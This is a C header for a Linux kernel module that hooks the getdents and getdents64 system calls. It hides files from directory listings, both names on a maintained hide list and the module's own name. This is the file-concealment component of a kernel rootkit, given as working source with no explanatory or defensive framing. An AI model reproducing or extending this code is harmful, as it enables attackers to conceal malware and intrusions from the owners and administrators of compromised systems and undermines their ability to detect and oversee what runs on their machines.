#ifndef RFILE_H
#define RFILE_H

#include <linux/kernel.h>
#include <linux/string.h>
#include <linux/types.h>
#include <linux/fs.h>
#include <linux/file.h>
#include <linux/dirent.h>
#include <linux/uaccess.h>
#include <asm/uaccess.h>
#include <linux/slab.h>

#include "config.h"


//#define NAME_OFFSET(de) ((int) ((de)->d_name - (char __user *) (de)))

// yes
extern hook_t _tbl[];

struct st_hide_file {
    char *name;
    struct list_head list;
};

LIST_HEAD(hide_files);

void file_unhide(char *name)
{
    struct st_hide_file *_file, *tmp;

    list_for_each_entry_safe( _file, tmp, &hide_files, list )
    {
        if (strncmp(name, _file->name, strlen(_file->name)) == 0)
        {
            list_del(&_file->list);
			
            kfree(_file->name);
            kfree(_file);
            break;
        }
    }
}

void file_hide(char *name)
{
    struct st_hide_file *_file;
	
	if(name == NULL || name[0] == '\0') {
	  return;
	}

    _file = kmalloc(sizeof(*_file), GFP_KERNEL);
    if ( ! _file )
        return;

    _file->name = name;

    list_add(&_file->list, &hide_files);
}

int lookup_files(char *name)
{
	struct st_hide_file *tmp_file;
    list_for_each_entry( tmp_file, &hide_files, list ){
        //if(strstr(name, tmp_file->name) != NULL) {
        if (strncmp(name, tmp_file->name, strlen(tmp_file->name)) == 0) {
            return 1;
        }
    }
	
	return 0;
}
/*
static int is_prefix(char* haystack, char* needle)
{
  char* haystack_ptr = haystack;
  char* needle_ptr = needle;

  if (needle == NULL) {
    return 0;
  }

  while (*needle_ptr != '\0') {
    if (*haystack_ptr == '\0' || *haystack_ptr != *needle_ptr) {
      return 0;
    }
    ++haystack_ptr;
    ++needle_ptr;
  }
  return 1;
}
*/

asmlinkage int __getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count)
{
  int ret;
	int result;
	hook_t *hk = NULL;
	asmlinkage int fn_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
    struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;
    int pos = 0;


	hk = &_tbl[3];

	ret = ((typeof(fn_getdents64) *)hk->stub_bak)(fd, dirp, count); 
  
    dirent_ker = kzalloc(ret, GFP_KERNEL);
    if ( (ret <= 0) || (dirent_ker == NULL) )
        return ret;

    long error;
        error = copy_from_user(dirent_ker, dirp, ret);
    if (error)
        goto done;

    // each loop 
    while (offset < ret)
    {
        current_dir = (void *)dirent_ker + offset;

		//if (is_prefix(current_dir->d_name, "testxxx")) 
        if((lookup_files(current_dir->d_name) == 1) || (memcmp(_kname, current_dir->d_name, strlen(_kname)) == 0)) 
        {
			debug("test dir:1111 - %s \n", current_dir->d_name);
			
            if ( current_dir == dirent_ker )
            {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }

            previous_dir->d_reclen += current_dir->d_reclen;
        }
        else
        {

            previous_dir = current_dir;
        }

        // Get the next dirent offset
        offset += current_dir->d_reclen;
    }

    // Overwrite the current dirent in user memory
    error = copy_to_user(dirp, dirent_ker, ret);
    if (error)
        goto done;

done:
    kfree(dirent_ker);
    return ret;
}

    struct linux_dirent {
        unsigned long d_ino;
        unsigned long d_off;
        unsigned short d_reclen;
        char d_name[];
    };
asmlinkage int __getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
{
    int ret;
   // int result;
	
    hook_t *hk = NULL;
    asmlinkage int fn_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
    struct linux_dirent *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;


	hk = &_tbl[2];

	ret = ((typeof(fn_getdents) *)hk->stub_bak)(fd, dirp, count); 

    dirent_ker = kzalloc(ret, GFP_KERNEL);
    if ( (ret <= 0) || (dirent_ker == NULL) )
        return ret;

    long error;
        error = copy_from_user(dirent_ker, dirp, ret);
    if (error)
        goto done;

    while (offset < ret)
    {
        current_dir = (void *)dirent_ker + offset;

        if((lookup_files(current_dir->d_name) == 1) || (memcmp(_kname, current_dir->d_name, strlen(_kname)) == 0)) 
        {
			debug("test dir:2222 - %s \n", current_dir->d_name);
            if ( current_dir == dirent_ker )
            {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }

            previous_dir->d_reclen += current_dir->d_reclen;
        }
        else
        {

            previous_dir = current_dir;
        }

        // Get the next dirent offset
        offset += current_dir->d_reclen;
    }

    // Overwrite the current dirent in user memory
    error = copy_to_user(dirp, dirent_ker, ret);
    if (error)
        goto done;

done:
    kfree(dirent_ker);
    return ret;

  return ret;
}


#endif

